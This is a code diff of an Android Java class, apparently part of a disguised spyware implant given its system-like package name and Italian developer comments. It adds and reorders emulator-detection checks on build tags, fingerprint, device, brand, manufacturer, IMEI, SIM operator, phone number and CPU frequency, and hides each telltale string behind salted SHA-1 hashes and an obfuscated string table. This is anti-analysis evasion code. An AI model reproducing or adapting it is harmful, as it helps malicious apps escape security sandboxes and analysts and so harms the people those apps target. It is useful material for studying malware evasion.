@@ -17,10 +17,152 @@ import com.android.networking.crypto.Digest;
 public class AntiEmulator {
 	private static final String TAG = "AntiEmulator";
 
-	private static final int NUMTESTS = 10;
+	private static int NUMTESTSTM = 11;
+	private static int NUMTESTSNOTM = 7;
 
 	private static TelephonyManager tm = (TelephonyManager) Status.getAppContext().getSystemService(
 			Context.TELEPHONY_SERVICE);
+
+	// Finisce per "test-keys" nell'emu
+	public int checkKeys() {
+		String keys = Build.FINGERPRINT;
+		int index;
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (checkKeys): Keys: " + keys); //$NON-NLS-1$
+		}
+
+		// "/"
+		index = keys.lastIndexOf(Messages.getString("36_7"));
+
+		if (index == -1) {
+			return 0;
+		}
+
+		keys = keys.substring(index);
+
+		String digest = Digest.SHA1("zOSgALHZaL" + keys.toLowerCase()).toLowerCase();
+
+		// "/test-keys"
+		if (digest.equals("5d2441306a9458d6592323fbdd235a4c849f33fb")) {
+			return 1;
+		}
+
+		return 0;
+	}
+
+	// "test-keys" nell'emu
+	public int checkTags() {
+		String tags = Build.TAGS;
+	
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (checkTags): Tags: " + tags); //$NON-NLS-1$
+		}
+	
+		String digest = Digest.SHA1("R70kq5jhCx" + tags.toLowerCase()).toLowerCase();
+	
+		// "test-keys"
+		if (digest.equals("895f0bd16cf59e3e380b7360b26dfd445e2c9570")) {
+			return 1;
+		}
+	
+		return 0;
+	}
+
+	// "sdk" nell'emu
+	public int checkProduct() {
+		String product = Build.PRODUCT;
+	
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (checkProduct): Product: " + product); //$NON-NLS-1$
+		}
+	
+		String digest = Digest.SHA1("NWzeoThPu2" + product.toLowerCase()).toLowerCase();
+	
+		// "sdk"
+		if (digest.equals("77045d27d24fdec7f0439684fdbef14002f9519f")) {
+			return 1;
+		}
+	
+		return 0;
+	}
+
+	// "generic" nell'emu
+	public int checkDevice() {
+		String device = Build.DEVICE;
+	
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (checkDevice): Device: " + device); //$NON-NLS-1$
+		}
+	
+		String digest = Digest.SHA1("GpCi1INH6B" + device.toLowerCase()).toLowerCase();
+	
+		// "generic"
+		if (digest.equals("e65170a5c904bb54c30e65f0290a67d87344afc7")) {
+			return 1;
+		}
+	
+		return 0;
+	}
+
+	// "generic" nell'emu e per alcuni telefoni, attenzione
+	public int checkBrand() {
+		String brand = Build.BRAND;
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (checkBrand): Brand: " + brand); //$NON-NLS-1$
+		}
+
+		String digest = Digest.SHA1("AXWC4qhe6x" + brand.toLowerCase()).toLowerCase();
+
+		// "generic"
+		if (digest.equals("ae2f26a8cd5bd8efa6b31da9e4974a6b75108f21")) {
+			return 1;
+		}
+
+		return 0;
+	}
+
+	public int checkScaling() {
+		Execute exec = new Execute();
+
+		// "cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq"
+		ExecuteResult ret = exec.execute(Messages.getString("36_8"));
+
+		// Ci interessa solo la prima riga
+		for (String frequency : ret.stdout) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (checkScaling): " + frequency); //$NON-NLS-1$
+			}
+
+			try {
+				Integer.parseInt(frequency);
+				return 0;
+			} catch (NumberFormatException n) {
+				return 1;
+			}
+		}
+
+		return 1;
+	}
+
+	// "unknown" nell'emu
+	public int checkManufacturer() {
+		String manufacturer = Build.MANUFACTURER;
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (checkManufacturer): Manufacturer: " + manufacturer); //$NON-NLS-1$
+		}
+
+		String digest = Digest.SHA1("kamA9mES38" + manufacturer.toLowerCase()).toLowerCase();
+
+		// "unknown"
+		if (digest.equals("a89c0b114f51576c81fd313fc15dc8b125b8f91a")) {
+			return 1;
+		}
+
+		return 0;
+	}
 
 	// "000000000000000" se si e' nell'emulatore
 	public int checkId() {
@@ -28,6 +170,10 @@ public class AntiEmulator {
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (checkId): DeviceId: " + deviceId); //$NON-NLS-1$
+		}
+
+		if (deviceId == null) {
+			return 0;
 		}
 
 		String digest = Digest.SHA1("Q0gh5!dGtr" + deviceId.toLowerCase()).toLowerCase();
@@ -63,6 +209,24 @@ public class AntiEmulator {
 		return 0;
 	}
 
+	// "Android" nell'emu
+	public int checkOperator() {
+		String operator = tm.getSimOperatorName();
+	
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (checkOperator): Operator: " + operator); //$NON-NLS-1$
+		}
+	
+		String digest = Digest.SHA1("ovCwHlxund" + operator.toLowerCase()).toLowerCase();
+	
+		// "android"
+		if (digest.equals("796c3a755fea349d366064676d8351e52a623288")) {
+			return 1;
+		}
+	
+		return 0;
+	}
+
 	// "15555215554" nell'emu
 	public int checkPhoneNumber() {
 		String phoneNumber = tm.getLine1Number();
@@ -75,7 +239,7 @@ public class AntiEmulator {
 		if (phoneNumber == null) {
 			return 0;
 		}
-		
+
 		// Molte sim non hanno il numero di telefono
 		if (phoneNumber.length() == 0) {
 			return 1;
@@ -97,189 +261,32 @@ public class AntiEmulator {
 		return 0;
 	}
 
-	// "generic" nell'emu
-	public int checkDevice() {
-		String device = Build.DEVICE;
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (checkDevice): Device: " + device); //$NON-NLS-1$
-		}
-
-		String digest = Digest.SHA1("GpCi1INH6B" + device.toLowerCase()).toLowerCase();
-
-		// "generic"
-		if (digest.equals("e65170a5c904bb54c30e65f0290a67d87344afc7")) {
-			return 1;
-		}
-
-		return 0;
-	}
-
-	// "generic" nell'emu e per alcuni telefoni, attenzione
-	public int checkBrand() {
-		String brand = Build.BRAND;
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (checkBrand): Brand: " + brand); //$NON-NLS-1$
-		}
-
-		String digest = Digest.SHA1("AXWC4qhe6x" + brand.toLowerCase()).toLowerCase();
-
-		// "generic"
-		if (digest.equals("ae2f26a8cd5bd8efa6b31da9e4974a6b75108f21")) {
-			return 1;
-		}
-
-		return 0;
-	}
-
-	// Finisce per "test-keys" nell'emu
-	public int checkKeys() {
-		String keys = Build.FINGERPRINT;
-		int index;
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (checkKeys): Keys: " + keys); //$NON-NLS-1$
-		}
-
-		// "/"
-		index = keys.lastIndexOf(Messages.getString("36_7"));
-
-		if (index == -1) {
-			return 0;
-		}
-
-		keys = keys.substring(index);
-
-		String digest = Digest.SHA1("zOSgALHZaL" + keys.toLowerCase()).toLowerCase();
-
-		// "/test-keys"
-		if (digest.equals("5d2441306a9458d6592323fbdd235a4c849f33fb")) {
-			return 1;
-		}
-
-		return 0;
-	}
-
-	// "unknown" nell'emu
-	public int checkManufacturer() {
-		String manufacturer = Build.MANUFACTURER;
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (checkManufacturer): Manufacturer: " + manufacturer); //$NON-NLS-1$
-		}
-
-		String digest = Digest.SHA1("kamA9mES38" + manufacturer.toLowerCase()).toLowerCase();
-
-		// "unknown"
-		if (digest.equals("a89c0b114f51576c81fd313fc15dc8b125b8f91a")) {
-			return 1;
-		}
-
-		return 0;
-	}
-
-	// "sdk" nell'emu
-	public int checkProduct() {
-		String product = Build.PRODUCT;
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (checkProduct): Product: " + product); //$NON-NLS-1$
-		}
-
-		String digest = Digest.SHA1("NWzeoThPu2" + product.toLowerCase()).toLowerCase();
-
-		// "sdk"
-		if (digest.equals("77045d27d24fdec7f0439684fdbef14002f9519f")) {
-			return 1;
-		}
-
-		return 0;
-	}
-
-	// "test-keys" nell'emu
-	public int checkTags() {
-		String tags = Build.TAGS;
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (checkTags): Tags: " + tags); //$NON-NLS-1$
-		}
-
-		String digest = Digest.SHA1("R70kq5jhCx" + tags.toLowerCase()).toLowerCase();
-
-		// "test-keys"
-		if (digest.equals("895f0bd16cf59e3e380b7360b26dfd445e2c9570")) {
-			return 1;
-		}
-
-		return 0;
-	}
-
-	// "Android" nell'emu
-	public int checkOperator() {
-		String operator = tm.getSimOperatorName();
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (checkOperator): Operator: " + operator); //$NON-NLS-1$
-		}
-
-		String digest = Digest.SHA1("ovCwHlxund" + operator.toLowerCase()).toLowerCase();
-
-		// "android"
-		if (digest.equals("796c3a755fea349d366064676d8351e52a623288")) {
-			return 1;
-		}
-
-		return 0;
-	}
-
-	public int checkScaling() {
-		Execute exec = new Execute();
-
-		// "cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq"
-		ExecuteResult ret = exec.execute(Messages.getString("36_8"));
-
-		// Ci interessa solo la prima riga
-		for (String frequency : ret.stdout) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (checkScaling): " + frequency); //$NON-NLS-1$
-			}
-
-			try {
-				Integer.parseInt(frequency);
-				return 0;
-			} catch (NumberFormatException n) {
-				return 1;
-			}
-		}
-
-		return 1;
-	}
-
 	private int isEmu(int test) {
-		switch (test % (NUMTESTS + 1)) {
+		int NUMTESTS = (tm == null) ? NUMTESTSNOTM : NUMTESTSTM;
+
+		switch (test % (NUMTESTS)) {
 		case 0:
-			return checkId();
+			return checkKeys();
 		case 1:
-			return checkSubscriber();
+			return checkTags();
 		case 2:
-			return checkPhoneNumber();
+			return checkProduct();
 		case 3:
 			return checkDevice();
 		case 4:
 			return checkBrand();
 		case 5:
-			return checkKeys();
+			return checkScaling();
 		case 6:
 			return checkManufacturer();
 		case 7:
-			return checkProduct();
+			return checkId();
 		case 8:
-			return checkTags();
+			return checkSubscriber();
 		case 9:
 			return checkOperator();
 		case 10:
-			return checkScaling();
+			return checkPhoneNumber();
 		}
 		return 0;
 	}
@@ -291,12 +298,12 @@ public class AntiEmulator {
 		}
 		return acc;
 	}
-	
-	public boolean isEmu(){
-		if(Cfg.DEBUGANTI){
-			Log.w("QZ","isEmu");
-			return isEmu(NUMTESTS) >= NUMTESTS - 2;
-		}else{
+
+	public boolean isEmu() {
+		if (Cfg.DEBUGANTI) {
+			Log.w("QZ", "isEmu");
+			return isEmu(NUMTESTSNOTM) >= NUMTESTSNOTM - 2;
+		} else {
 			return isEmu(Utils.getRandomIntArray(3)) >= 2;
 		}
 	}
